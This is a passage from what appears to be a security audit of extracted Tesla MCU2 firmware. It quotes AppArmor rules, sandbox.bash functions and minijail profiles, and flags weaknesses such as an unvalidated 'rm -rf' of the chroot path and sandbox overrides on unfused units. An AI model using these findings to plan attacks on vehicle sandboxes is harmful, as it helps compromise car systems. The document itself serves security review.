<a id=__codelineno-12-4 name=__codelineno-12-4 href=#__codelineno-12-4></a>
<a id=__codelineno-12-5 name=__codelineno-12-5 href=#__codelineno-12-5></a># Hardware control
<a id=__codelineno-12-6 name=__codelineno-12-6 href=#__codelineno-12-6></a>/sys/class/pwm/pwmchip0/pwm0/duty_cycle w,
<a id=__codelineno-12-7 name=__codelineno-12-7 href=#__codelineno-12-7></a>/sys/class/gpio/gpio[0-9]*/direction w,
<a id=__codelineno-12-8 name=__codelineno-12-8 href=#__codelineno-12-8></a>/sys/class/drm/card0-DP-1/status w,
<a id=__codelineno-12-9 name=__codelineno-12-9 href=#__codelineno-12-9></a>/sys/devices/system/cpu/cpu[0-9]*/power/pm_qos_resume_latency_us w,
<a id=__codelineno-12-10 name=__codelineno-12-10 href=#__codelineno-12-10></a>/sys/kernel/debug/dri/**/i915_dpcd r,
<a id=__codelineno-12-11 name=__codelineno-12-11 href=#__codelineno-12-11></a>
<a id=__codelineno-12-12 name=__codelineno-12-12 href=#__codelineno-12-12></a># Gaming partition
<a id=__codelineno-12-13 name=__codelineno-12-13 href=#__codelineno-12-13></a>/opt/games/var/available/* w,
<a id=__codelineno-12-14 name=__codelineno-12-14 href=#__codelineno-12-14></a>/opt/games/usr/* w,                               # Write games directly!
<a id=__codelineno-12-15 name=__codelineno-12-15 href=#__codelineno-12-15></a>
<a id=__codelineno-12-16 name=__codelineno-12-16 href=#__codelineno-12-16></a># Sentinel files
<a id=__codelineno-12-17 name=__codelineno-12-17 href=#__codelineno-12-17></a>/var{,/log,/run}/.smcanary rw,
<a id=__codelineno-12-18 name=__codelineno-12-18 href=#__codelineno-12-18></a>/home/tesla/.smcanary rw,
<a id=__codelineno-12-19 name=__codelineno-12-19 href=#__codelineno-12-19></a>
<a id=__codelineno-12-20 name=__codelineno-12-20 href=#__codelineno-12-20></a># Asset generation
<a id=__codelineno-12-21 name=__codelineno-12-21 href=#__codelineno-12-21></a>/home/godot/.Tesla/data/AssetGen/{,**} rw,
<a id=__codelineno-12-22 name=__codelineno-12-22 href=#__codelineno-12-22></a>/home/unreal/.Tesla/data/AssetGen/{,**} rw,
<a id=__codelineno-12-23 name=__codelineno-12-23 href=#__codelineno-12-23></a>
<a id=__codelineno-12-24 name=__codelineno-12-24 href=#__codelineno-12-24></a># USB driver control
<a id=__codelineno-12-25 name=__codelineno-12-25 href=#__codelineno-12-25></a>/sys/bus/usb/drivers/hub/{bind,unbind} w,
<a id=__codelineno-12-26 name=__codelineno-12-26 href=#__codelineno-12-26></a>
<a id=__codelineno-12-27 name=__codelineno-12-27 href=#__codelineno-12-27></a># Odin socket
<a id=__codelineno-12-28 name=__codelineno-12-28 href=#__codelineno-12-28></a>/tmp/odin.sock rw,
</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/apparmor.d/abstractions/escalator/rwfile</code> [Lines 1-41]</p> <p><strong>ðŸš¨ CRITICAL:</strong> Escalator rwfile allows: - Direct write to <code>/opt/games/usr/*</code> (gaming partition) - USB driver manipulation (bind/unbind) - Odin Python framework socket access</p> <hr> <h2 id=4-sandboxbash-implementation>4. Sandbox.bash Implementation</h2> <h3 id=41-overview>4.1 Overview</h3> <p><strong>Path:</strong> <code>/etc/sandbox/sandbox.bash</code><br> <strong>Purpose:</strong> Wrapper script that configures minijail0, cgroups, network namespaces, and AppArmor for sandboxed services.</p> <p><strong>Usage:</strong> <div class=highlight><pre><span></span><code><a id=__codelineno-13-1 name=__codelineno-13-1 href=#__codelineno-13-1></a><span class=ch>#!/bin/bash</span>
<a id=__codelineno-13-2 name=__codelineno-13-2 href=#__codelineno-13-2></a>.<span class=w> </span>/etc/sandbox/sandbox.bash<span class=w> </span>&lt;log_tag&gt;<span class=w> </span>&lt;profile_name&gt;
<a id=__codelineno-13-3 name=__codelineno-13-3 href=#__codelineno-13-3></a>
<a id=__codelineno-13-4 name=__codelineno-13-4 href=#__codelineno-13-4></a>StopSandbox<span class=w>   </span><span class=c1># Cleanup</span>
<a id=__codelineno-13-5 name=__codelineno-13-5 href=#__codelineno-13-5></a>RunSandbox<span class=w> </span>/path/to/binary<span class=w> </span>--args
</code></pre></div></p> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/sandbox/sandbox.bash</code> [Lines 1-25]</p> <hr> <h3 id=42-key-functions>4.2 Key Functions</h3> <h4 id=runsandbox-main-execution><code>RunSandbox</code> - Main Execution</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-14-1 name=__codelineno-14-1 href=#__codelineno-14-1></a>RunSandbox<span class=w> </span><span class=o>()</span><span class=w> </span><span class=o>{</span>
<a id=__codelineno-14-2 name=__codelineno-14-2 href=#__codelineno-14-2></a><span class=w>    </span><span class=c1># Check if minijail process already running</span>
<a id=__codelineno-14-3 name=__codelineno-14-3 href=#__codelineno-14-3></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=o>[[</span><span class=w> </span>-n<span class=w> </span><span class=nv>$PIDFILE</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>-f<span class=w> </span><span class=nv>$PIDFILE</span><span class=w> </span><span class=o>]]</span><span class=p>;</span><span class=w> </span><span class=k>then</span>
<a id=__codelineno-14-4 name=__codelineno-14-4 href=#__codelineno-14-4></a><span class=w>        </span><span class=k>if</span><span class=w> </span>pgrep<span class=w> </span>-f<span class=w> </span><span class=s2>&quot;minijail0.*</span><span class=nv>$PIDFILE</span><span class=s2>&quot;</span><span class=w> </span><span class=p>|</span><span class=w> </span>grep<span class=w> </span><span class=s2>&quot;</span><span class=k>$(</span>&lt;<span class=s2>&quot;</span><span class=nv>$PIDFILE</span><span class=s2>&quot;</span><span class=k>)</span><span class=s2>&quot;</span><span class=p>;</span><span class=w> </span><span class=k>then</span>
<a id=__codelineno-14-5 name=__codelineno-14-5 href=#__codelineno-14-5></a><span class=w>            </span>print_error<span class=w> </span><span class=s2>&quot;Process is still running: </span><span class=k>$(</span>&lt;<span class=s2>&quot;</span><span class=nv>$PIDFILE</span><span class=s2>&quot;</span><span class=k>)</span><span class=s2>&quot;</span><span class=p>;</span>
<a id=__codelineno-14-6 name=__codelineno-14-6 href=#__codelineno-14-6></a><span class=w>        </span><span class=k>fi</span><span class=p>;</span>
<a id=__codelineno-14-7 name=__codelineno-14-7 href=#__codelineno-14-7></a><span class=w>        </span>die<span class=w> </span><span class=s2>&quot;PID file exists (</span><span class=nv>$PIDFILE</span><span class=s2>) use StopSandbox&quot;</span><span class=p>;</span>
<a id=__codelineno-14-8 name=__codelineno-14-8 href=#__codelineno-14-8></a><span class=w>    </span><span class=k>fi</span>
<a id=__codelineno-14-9 name=__codelineno-14-9 href=#__codelineno-14-9></a>
<a id=__codelineno-14-10 name=__codelineno-14-10 href=#__codelineno-14-10></a><span class=w>    </span><span class=c1># Create chroot skeleton</span>
<a id=__codelineno-14-11 name=__codelineno-14-11 href=#__codelineno-14-11></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=o>[[</span><span class=w> </span>-n<span class=w> </span><span class=nv>$CHROOT_DIR</span><span class=w> </span><span class=o>]]</span><span class=p>;</span><span class=w> </span><span class=k>then</span>
<a id=__codelineno-14-12 name=__codelineno-14-12 href=#__codelineno-14-12></a><span class=w>        </span>CreateChrootSkeleton<span class=w> </span><span class=s2>&quot;</span><span class=nv>$CHROOT_DIR</span><span class=s2>&quot;</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=nb>exit</span><span class=w> </span><span class=m>1</span><span class=p>;</span>
<a id=__codelineno-14-13 name=__codelineno-14-13 href=#__codelineno-14-13></a><span class=w>    </span><span class=k>fi</span>
<a id=__codelineno-14-14 name=__codelineno-14-14 href=#__codelineno-14-14></a>
<a id=__codelineno-14-15 name=__codelineno-14-15 href=#__codelineno-14-15></a><span class=w>    </span><span class=c1># Setup network namespace with virtual ethernet</span>
<a id=__codelineno-14-16 name=__codelineno-14-16 href=#__codelineno-14-16></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=o>[[</span><span class=w> </span>-n<span class=w> </span><span class=nv>$NET_NS_NAME</span><span class=w> </span><span class=o>]]</span><span class=p>;</span><span class=w> </span><span class=k>then</span>
<a id=__codelineno-14-17 name=__codelineno-14-17 href=#__codelineno-14-17></a><span class=w>        </span>ip<span class=w> </span>netns<span class=w> </span>add<span class=w> </span><span class=s2>&quot;</span><span class=nv>$NET_NS_NAME</span><span class=s2>&quot;</span><span class=p>;</span>
<a id=__codelineno-14-18 name=__codelineno-14-18 href=#__codelineno-14-18></a><span class=w>        </span><span class=c1># Configure veth pair, NAT, iptables rules</span>
<a id=__codelineno-14-19 name=__codelineno-14-19 href=#__codelineno-14-19></a><span class=w>    </span><span class=k>fi</span>
<a id=__codelineno-14-20 name=__codelineno-14-20 href=#__codelineno-14-20></a>
<a id=__codelineno-14-21 name=__codelineno-14-21 href=#__codelineno-14-21></a><span class=w>    </span><span class=c1># Setup cgroups (cpu, memory, net_cls, freezer)</span>
<a id=__codelineno-14-22 name=__codelineno-14-22 href=#__codelineno-14-22></a><span class=w>    </span><span class=c1># Setup AppHome for per-profile storage</span>
<a id=__codelineno-14-23 name=__codelineno-14-23 href=#__codelineno-14-23></a>
<a id=__codelineno-14-24 name=__codelineno-14-24 href=#__codelineno-14-24></a><span class=w>    </span><span class=c1># Execute with minijail</span>
<a id=__codelineno-14-25 name=__codelineno-14-25 href=#__codelineno-14-25></a><span class=w>    </span><span class=nb>exec</span><span class=w> </span><span class=nv>$CGEXEC</span><span class=w> </span><span class=nv>$PREAMBLE</span><span class=w> </span><span class=nv>$MINIJAIL</span><span class=w> </span><span class=nv>$MINIJAIL_ARGS</span><span class=w> </span>--<span class=w> </span><span class=s2>&quot;</span><span class=nv>$@</span><span class=s2>&quot;</span><span class=p>;</span>
<a id=__codelineno-14-26 name=__codelineno-14-26 href=#__codelineno-14-26></a><span class=o>}</span>
</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/sandbox/sandbox.bash</code> [Lines 221-360]</p> <hr> <h4 id=createchrootskeleton-chroot-preparation><code>CreateChrootSkeleton</code> - Chroot Preparation</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-15-1 name=__codelineno-15-1 href=#__codelineno-15-1></a>CreateChrootSkeleton<span class=w> </span><span class=o>()</span><span class=w> </span><span class=o>{</span>
<a id=__codelineno-15-2 name=__codelineno-15-2 href=#__codelineno-15-2></a><span class=w>    </span><span class=nb>local</span><span class=w> </span><span class=nv>CHROOT</span><span class=o>=</span><span class=s2>&quot;</span><span class=nv>$1</span><span class=s2>&quot;</span><span class=p>;</span>
<a id=__codelineno-15-3 name=__codelineno-15-3 href=#__codelineno-15-3></a><span class=w>    </span>rm<span class=w> </span>-rf<span class=w> </span><span class=s2>&quot;</span><span class=nv>$CHROOT</span><span class=s2>&quot;</span><span class=p>;</span><span class=w>           </span><span class=c1># DANGEROUS: Deletes existing chroot!</span>
<a id=__codelineno-15-4 name=__codelineno-15-4 href=#__codelineno-15-4></a><span class=w>    </span>mkdir<span class=w> </span>-p<span class=w> </span><span class=s2>&quot;</span><span class=nv>$CHROOT</span><span class=s2>&quot;</span><span class=p>;</span>
<a id=__codelineno-15-5 name=__codelineno-15-5 href=#__codelineno-15-5></a><span class=w>    </span>mkdir<span class=w> </span>-p<span class=w> </span><span class=s2>&quot;</span><span class=nv>$CHROOT</span><span class=s2>/dev&quot;</span><span class=p>;</span>
<a id=__codelineno-15-6 name=__codelineno-15-6 href=#__codelineno-15-6></a><span class=w>    </span>mkdir<span class=w> </span>-p<span class=w> </span><span class=s2>&quot;</span><span class=nv>$CHROOT</span><span class=s2>/tmp&quot;</span><span class=p>;</span>
<a id=__codelineno-15-7 name=__codelineno-15-7 href=#__codelineno-15-7></a><span class=w>    </span>ln<span class=w> </span>-s<span class=w> </span><span class=s2>&quot;</span><span class=k>$(</span>readlink<span class=w> </span>-f<span class=w> </span>/lib64<span class=k>)</span><span class=s2>&quot;</span><span class=w> </span><span class=s2>&quot;</span><span class=nv>$CHROOT</span><span class=s2>/lib64&quot;</span>
<a id=__codelineno-15-8 name=__codelineno-15-8 href=#__codelineno-15-8></a><span class=o>}</span>
</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/sandbox/sandbox.bash</code> [Lines 126-132]</p> <p><strong>ðŸš¨ VULNERABILITY:</strong> <code>rm -rf "$CHROOT"</code> without validation could be exploited if <code>$CHROOT_DIR</code> is attacker-controlled.</p> <hr> <h4 id=network-namespace-setup>Network Namespace Setup</h4> <div class=highlight><pre><span></span><code><a id=__codelineno-16-1 name=__codelineno-16-1 href=#__codelineno-16-1></a><span class=k>if</span><span class=w> </span><span class=o>[[</span><span class=w> </span>-n<span class=w> </span><span class=nv>$NET_NS_NAME</span><span class=w> </span><span class=o>]]</span><span class=p>;</span><span class=w> </span><span class=k>then</span>
<a id=__codelineno-16-2 name=__codelineno-16-2 href=#__codelineno-16-2></a><span class=w>    </span><span class=k>if</span><span class=w> </span>!<span class=w> </span><span class=o>[</span><span class=w> </span>-f<span class=w> </span><span class=s2>&quot;/var/run/netns/</span><span class=nv>$NET_NS_NAME</span><span class=s2>&quot;</span><span class=w> </span><span class=o>]</span><span class=p>;</span><span class=w> </span><span class=k>then</span>
<a id=__codelineno-16-3 name=__codelineno-16-3 href=#__codelineno-16-3></a><span class=w>        </span>RunOrDie<span class=w> </span>ip<span class=w> </span>netns<span class=w> </span>add<span class=w> </span><span class=s2>&quot;</span><span class=nv>$NET_NS_NAME</span><span class=s2>&quot;</span><span class=p>;</span>
<a id=__codelineno-16-4 name=__codelineno-16-4 href=#__codelineno-16-4></a><span class=w>    </span><span class=k>fi</span><span class=p>;</span>
<a id=__codelineno-16-5 name=__codelineno-16-5 href=#__codelineno-16-5></a>
<a id=__codelineno-16-6 name=__codelineno-16-6 href=#__codelineno-16-6></a><span class=w>    </span><span class=c1># Create veth pair</span>
<a id=__codelineno-16-7 name=__codelineno-16-7 href=#__codelineno-16-7></a><span class=w>    </span><span class=nv>VETH</span><span class=o>=</span><span class=s2>&quot;veth</span><span class=nv>$NET_NS_VETHID</span><span class=s2>&quot;</span><span class=p>;</span>
<a id=__codelineno-16-8 name=__codelineno-16-8 href=#__codelineno-16-8></a><span class=w>    </span><span class=nv>VPEER</span><span class=o>=</span><span class=s2>&quot;vpeer</span><span class=nv>$NET_NS_VETHID</span><span class=s2>&quot;</span><span class=p>;</span>
<a id=__codelineno-16-9 name=__codelineno-16-9 href=#__codelineno-16-9></a><span class=w>    </span><span class=nv>SUBNET_PREFIX</span><span class=o>=</span><span class=s2>&quot;192.168.93&quot;</span><span class=p>;</span>
<a id=__codelineno-16-10 name=__codelineno-16-10 href=#__codelineno-16-10></a>
<a id=__codelineno-16-11 name=__codelineno-16-11 href=#__codelineno-16-11></a><span class=w>    </span><span class=c1># Calculate IP addresses</span>
<a id=__codelineno-16-12 name=__codelineno-16-12 href=#__codelineno-16-12></a><span class=w>    </span><span class=nv>NETWORK_ADDR</span><span class=o>=</span><span class=k>$((</span><span class=w> </span><span class=nv>NET_NS_VETHID</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=m>4</span><span class=w> </span><span class=k>))</span><span class=p>;</span>
<a id=__codelineno-16-13 name=__codelineno-16-13 href=#__codelineno-16-13></a><span class=w>    </span><span class=nv>VETH_HOST</span><span class=o>=</span><span class=k>$((</span><span class=w> </span><span class=nv>NETWORK_ADDR</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=m>1</span><span class=w> </span><span class=k>))</span><span class=p>;</span>
<a id=__codelineno-16-14 name=__codelineno-16-14 href=#__codelineno-16-14></a><span class=w>    </span><span class=nv>VETH_ADDR</span><span class=o>=</span><span class=s2>&quot;</span><span class=nv>$SUBNET_PREFIX</span><span class=s2>.</span><span class=nv>$VETH_HOST</span><span class=s2>&quot;</span><span class=p>;</span>
<a id=__codelineno-16-15 name=__codelineno-16-15 href=#__codelineno-16-15></a><span class=w>    </span><span class=nv>VPEER_HOST</span><span class=o>=</span><span class=k>$((</span><span class=w> </span><span class=nv>NETWORK_ADDR</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=m>2</span><span class=w> </span><span class=k>))</span><span class=p>;</span>
<a id=__codelineno-16-16 name=__codelineno-16-16 href=#__codelineno-16-16></a><span class=w>    </span><span class=nv>VPEER_ADDR</span><span class=o>=</span><span class=s2>&quot;</span><span class=nv>$SUBNET_PREFIX</span><span class=s2>.</span><span class=nv>$VPEER_HOST</span><span class=s2>&quot;</span><span class=p>;</span>
<a id=__codelineno-16-17 name=__codelineno-16-17 href=#__codelineno-16-17></a>
<a id=__codelineno-16-18 name=__codelineno-16-18 href=#__codelineno-16-18></a><span class=w>    </span><span class=c1># Setup NAT and iptables rules</span>
<a id=__codelineno-16-19 name=__codelineno-16-19 href=#__codelineno-16-19></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=o>[[</span><span class=w> </span>-n<span class=w> </span><span class=nv>$NET_NS_NAT</span><span class=w> </span><span class=o>]]</span><span class=p>;</span><span class=w> </span><span class=k>then</span>
<a id=__codelineno-16-20 name=__codelineno-16-20 href=#__codelineno-16-20></a><span class=w>        </span>iptables-restore<span class=w> </span>-w<span class=w> </span><span class=m>10</span><span class=w> </span>--noflush<span class=w> </span><span class=s>&lt;&lt;EOF</span>
<a id=__codelineno-16-21 name=__codelineno-16-21 href=#__codelineno-16-21></a><span class=s>*filter</span>
<a id=__codelineno-16-22 name=__codelineno-16-22 href=#__codelineno-16-22></a><span class=s>-A FORWARD -i $VETH -j $NET_NS_IPTABLES</span>
<a id=__codelineno-16-23 name=__codelineno-16-23 href=#__codelineno-16-23></a><span class=s>-A FORWARD -i $VETH -j ACCEPT</span>
<a id=__codelineno-16-24 name=__codelineno-16-24 href=#__codelineno-16-24></a><span class=s>-A FORWARD -o $VETH -m state --state ESTABLISHED -j ACCEPT</span>
<a id=__codelineno-16-25 name=__codelineno-16-25 href=#__codelineno-16-25></a><span class=s>*nat</span>
<a id=__codelineno-16-26 name=__codelineno-16-26 href=#__codelineno-16-26></a><span class=s>-A POSTROUTING -s $VPEER_ADDR/30 -j MASQUERADE</span>
<a id=__codelineno-16-27 name=__codelineno-16-27 href=#__codelineno-16-27></a><span class=s>COMMIT</span>
<a id=__codelineno-16-28 name=__codelineno-16-28 href=#__codelineno-16-28></a><span class=s>EOF</span>
<a id=__codelineno-16-29 name=__codelineno-16-29 href=#__codelineno-16-29></a><span class=w>    </span><span class=k>fi</span>
<a id=__codelineno-16-30 name=__codelineno-16-30 href=#__codelineno-16-30></a><span class=k>fi</span>
</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/sandbox/sandbox.bash</code> [Lines 274-315]</p> <p><strong>Network Isolation Details:</strong> - Each sandbox gets a <code>/30</code> network (<code>192.168.93.X/30</code>) - VETH_ID determines subnet: ID=35 â†’ <code>192.168.93.140/30</code> - NAT allows outbound, firewall chain controls access</p> <hr> <h3 id=43-sandbox-profile-loading>4.3 Sandbox Profile Loading</h3> <p><strong>Engineering Mode Bypass:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-17-1 name=__codelineno-17-1 href=#__codelineno-17-1></a>IsEngScope<span class=w> </span><span class=o>()</span><span class=w> </span><span class=o>{</span><span class=w> </span>
<a id=__codelineno-17-2 name=__codelineno-17-2 href=#__codelineno-17-2></a><span class=w>    </span>!<span class=w> </span>/usr/bin/is-fused<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=o>[[</span><span class=w> </span>-x<span class=w> </span>/sbin/run-overlay<span class=w> </span><span class=o>||</span><span class=w> </span>-x<span class=w> </span>/sbin/load_overlay<span class=w> </span><span class=o>]]</span>
<a id=__codelineno-17-3 name=__codelineno-17-3 href=#__codelineno-17-3></a><span class=o>}</span>
<a id=__codelineno-17-4 name=__codelineno-17-4 href=#__codelineno-17-4></a>
<a id=__codelineno-17-5 name=__codelineno-17-5 href=#__codelineno-17-5></a><span class=k>if</span><span class=w> </span>IsEngScope<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=o>[[</span><span class=w> </span><span class=s2>&quot;</span><span class=nv>$PROFILE</span><span class=s2>&quot;</span><span class=w> </span>-nt<span class=w> </span><span class=s2>&quot;</span><span class=nv>$ENV_PROFILE</span><span class=s2>&quot;</span><span class=w> </span><span class=o>||</span><span class=w> </span>!<span class=w> </span>-f<span class=w> </span><span class=s2>&quot;</span><span class=nv>$ENV_PROFILE</span><span class=s2>&quot;</span><span class=w> </span><span class=o>]]</span><span class=p>;</span><span class=w> </span><span class=k>then</span>
<a id=__codelineno-17-6 name=__codelineno-17-6 href=#__codelineno-17-6></a><span class=w>    </span><span class=c1># Load JSON profile instead of compiled .vars</span>
<a id=__codelineno-17-7 name=__codelineno-17-7 href=#__codelineno-17-7></a><span class=w>    </span><span class=nb>source</span><span class=w> </span>/etc/sandbox/sandbox-dev.bash<span class=w> </span><span class=s2>&quot;</span><span class=nv>$LOG_TAG</span><span class=s2>&quot;</span><span class=w> </span><span class=s2>&quot;</span><span class=nv>$PROFILE</span><span class=s2>&quot;</span><span class=w> </span><span class=o>||</span><span class=w> </span>die
<a id=__codelineno-17-8 name=__codelineno-17-8 href=#__codelineno-17-8></a><span class=k>else</span>
<a id=__codelineno-17-9 name=__codelineno-17-9 href=#__codelineno-17-9></a><span class=w>    </span><span class=c1># Load precompiled vars</span>
<a id=__codelineno-17-10 name=__codelineno-17-10 href=#__codelineno-17-10></a><span class=w>    </span><span class=nb>source</span><span class=w> </span><span class=s2>&quot;</span><span class=si>${</span><span class=nv>ENV_PROFILE</span><span class=si>}</span><span class=s2>&quot;</span><span class=w> </span><span class=o>||</span><span class=w> </span>die<span class=w> </span><span class=s2>&quot;Failed to source </span><span class=nv>$ENV_PROFILE</span><span class=s2>&quot;</span><span class=p>;</span>
<a id=__codelineno-17-11 name=__codelineno-17-11 href=#__codelineno-17-11></a><span class=k>fi</span>
</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/sandbox/sandbox.bash</code> [Lines 150-157]</p> <p><strong>ðŸš¨ SECURITY WEAKNESS:</strong> On <strong>unfused</strong> (development) units, JSON profiles can override compiled configs. If attacker can write to <code>/etc/sandbox.d/json/*.json</code>, they can weaken sandboxes.</p> <hr> <h3 id=44-apparmor-integration>4.4 AppArmor Integration</h3> <div class=highlight><pre><span></span><code><a id=__codelineno-18-1 name=__codelineno-18-1 href=#__codelineno-18-1></a><span class=k>if</span><span class=w> </span>!<span class=w> </span>grep<span class=w> </span>-q<span class=w> </span>-F<span class=w> </span><span class=s2>&quot;</span><span class=nv>$BINPATH</span><span class=s2>&quot;</span><span class=w> </span>/sys/kernel/security/apparmor/profiles<span class=p>;</span><span class=w> </span><span class=k>then</span>
<a id=__codelineno-18-2 name=__codelineno-18-2 href=#__codelineno-18-2></a><span class=w>    </span>print_out<span class=w> </span>--<span class=w> </span><span class=s2>&quot;sandbox.bash: no apparmor profile for </span><span class=nv>$BINPATH</span><span class=s2>&quot;</span><span class=p>;</span>
<a id=__codelineno-18-3 name=__codelineno-18-3 href=#__codelineno-18-3></a><span class=k>fi</span><span class=p>;</span>
<a id=__codelineno-18-4 name=__codelineno-18-4 href=#__codelineno-18-4></a>
<a id=__codelineno-18-5 name=__codelineno-18-5 href=#__codelineno-18-5></a><span class=c1># Minijail will apply AppArmor profile automatically via kernel</span>
<a id=__codelineno-18-6 name=__codelineno-18-6 href=#__codelineno-18-6></a><span class=nb>exec</span><span class=w> </span><span class=nv>$CGEXEC</span><span class=w> </span><span class=nv>$PREAMBLE</span><span class=w> </span><span class=nv>$MINIJAIL</span><span class=w> </span><span class=nv>$MINIJAIL_ARGS</span><span class=w> </span>--<span class=w> </span><span class=s2>&quot;</span><span class=nv>$@</span><span class=s2>&quot;</span><span class=p>;</span>
</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/sandbox/sandbox.bash</code> [Lines 349-356]</p> <p><strong>Note:</strong> Warning is logged but execution continues even if no AppArmor profile exists!</p> <hr> <h2 id=5-minijail0-sandbox-configurations>5. Minijail0 Sandbox Configurations</h2> <h3 id=51-updater-envoy-profile>5.1 Updater-Envoy Profile</h3> <p><strong>Path:</strong> <code>/etc/sandbox.d/vars/updater-envoy.vars</code></p> <div class=highlight><pre><span></span><code><a id=__codelineno-19-1 name=__codelineno-19-1 href=#__codelineno-19-1></a><span class=nv>MINIJAIL</span><span class=o>=</span><span class=s1>&#39;/bin/minijail0 </span>
<a id=__codelineno-19-2 name=__codelineno-19-2 href=#__codelineno-19-2></a><span class=s1>    -T static              # Static policy</span>
<a id=__codelineno-19-3 name=__codelineno-19-3 href=#__codelineno-19-3></a><span class=s1>    -l                     # IPC namespace</span>
<a id=__codelineno-19-4 name=__codelineno-19-4 href=#__codelineno-19-4></a><span class=s1>    -p                     # PID namespace</span>
<a id=__codelineno-19-5 name=__codelineno-19-5 href=#__codelineno-19-5></a><span class=s1>    -v                     # VFS namespace</span>
<a id=__codelineno-19-6 name=__codelineno-19-6 href=#__codelineno-19-6></a><span class=s1>    -P /run/chroot/updater-envoy    # Pivot root</span>
<a id=__codelineno-19-7 name=__codelineno-19-7 href=#__codelineno-19-7></a><span class=s1>    -K                     # Don&#39;</span>t<span class=w> </span>mark<span class=w> </span>slave
<a id=__codelineno-19-8 name=__codelineno-19-8 href=#__codelineno-19-8></a><span class=w>    </span>-b/usr/,/usr/<span class=w>          </span><span class=c1># Bind mount /usr</span>
<a id=__codelineno-19-9 name=__codelineno-19-9 href=#__codelineno-19-9></a><span class=w>    </span>-b/lib/,/lib/<span class=w>          </span><span class=c1># Bind mount /lib</span>
<a id=__codelineno-19-10 name=__codelineno-19-10 href=#__codelineno-19-10></a><span class=w>    </span>-b/etc/,/etc/<span class=w>          </span><span class=c1># Bind mount /etc (read-only!)</span>
<a id=__codelineno-19-11 name=__codelineno-19-11 href=#__codelineno-19-11></a><span class=w>    </span>-b/deploy/gadget-updater,/deploy/gadget-updater
<a id=__codelineno-19-12 name=__codelineno-19-12 href=#__codelineno-19-12></a><span class=w>    </span>-b/proc/,/proc/
<a id=__codelineno-19-13 name=__codelineno-19-13 href=#__codelineno-19-13></a><span class=w>    </span>-b/usr/bin/updater-envoy,/usr/bin/updater-envoy
<a id=__codelineno-19-14 name=__codelineno-19-14 href=#__codelineno-19-14></a><span class=w>    </span>-b/dev/log,/dev/log,1<span class=w>  </span><span class=c1># Syslog socket (writable)</span>
<a id=__codelineno-19-15 name=__codelineno-19-15 href=#__codelineno-19-15></a><span class=w>    </span>-b/tmp,/tmp,1<span class=w>          </span><span class=c1># Temp (writable)</span>
<a id=__codelineno-19-16 name=__codelineno-19-16 href=#__codelineno-19-16></a><span class=w>    </span>-r<span class=w> </span>-d<span class=w> </span>-n<span class=w>               </span><span class=c1># Remount read-only, detach, new session</span>
<a id=__codelineno-19-17 name=__codelineno-19-17 href=#__codelineno-19-17></a><span class=w>    </span>-u<span class=w> </span>envoy<span class=w> </span>-g<span class=w> </span>envoy<span class=w> </span>-G<span class=w>   </span><span class=c1># Drop to user envoy</span>
<a id=__codelineno-19-18 name=__codelineno-19-18 href=#__codelineno-19-18></a><span class=w>    </span>--kafel<span class=w> </span>-S<span class=w> </span>/etc/kafel/updater-envoy.kafel<span class=w>  </span><span class=c1># Seccomp filter</span>
<a id=__codelineno-19-19 name=__codelineno-19-19 href=#__codelineno-19-19></a><span class=w>    </span>-f<span class=w> </span>/run/service/updater-envoy/updater-envoy.pid<span class=s1>&#39;  # PID file</span>
<a id=__codelineno-19-20 name=__codelineno-19-20 href=#__codelineno-19-20></a>
<a id=__codelineno-19-21 name=__codelineno-19-21 href=#__codelineno-19-21></a><span class=s1>CHROOT_DIR=&#39;</span>/run/chroot/updater-envoy<span class=s1>&#39;</span>
<a id=__codelineno-19-22 name=__codelineno-19-22 href=#__codelineno-19-22></a><span class=s1>PIDNAMESPACE=&#39;</span>true<span class=s1>&#39;</span>
<a id=__codelineno-19-23 name=__codelineno-19-23 href=#__codelineno-19-23></a><span class=s1>KAFEL=&#39;</span>/etc/kafel/updater-envoy.kafel<span class=err>&#39;</span>
</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/sandbox.d/vars/updater-envoy.vars</code></p> <p><strong>Restrictions:</strong> - Chroot to <code>/run/chroot/updater-envoy</code> - PID/IPC/VFS namespaces isolate from host - Drops to non-root user <code>envoy:envoy</code> - Seccomp-BPF syscall filtering via Kafel</p> <hr> <h3 id=52-chromium-sandbox-profile>5.2 Chromium Sandbox Profile</h3> <p><strong>Path:</strong> <code>/etc/sandbox.d/vars/chromium.vars</code></p> <p><strong>Network Namespace:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-20-1 name=__codelineno-20-1 href=#__codelineno-20-1></a><span class=nv>NET_NS_NAME</span><span class=o>=</span><span class=s1>&#39;chromium&#39;</span>
<a id=__codelineno-20-2 name=__codelineno-20-2 href=#__codelineno-20-2></a><span class=nv>NET_NS_VETHID</span><span class=o>=</span><span class=s1>&#39;35&#39;</span><span class=w>                    </span><span class=c1># Subnet 192.168.93.140/30</span>
<a id=__codelineno-20-3 name=__codelineno-20-3 href=#__codelineno-20-3></a><span class=nv>NET_NS_NAT</span><span class=o>=</span><span class=s1>&#39;true&#39;</span>
<a id=__codelineno-20-4 name=__codelineno-20-4 href=#__codelineno-20-4></a><span class=nv>NET_NS_IPTABLES</span><span class=o>=</span><span class=s1>&#39;INTERNET&#39;</span><span class=w>            </span><span class=c1># Firewall chain name</span>
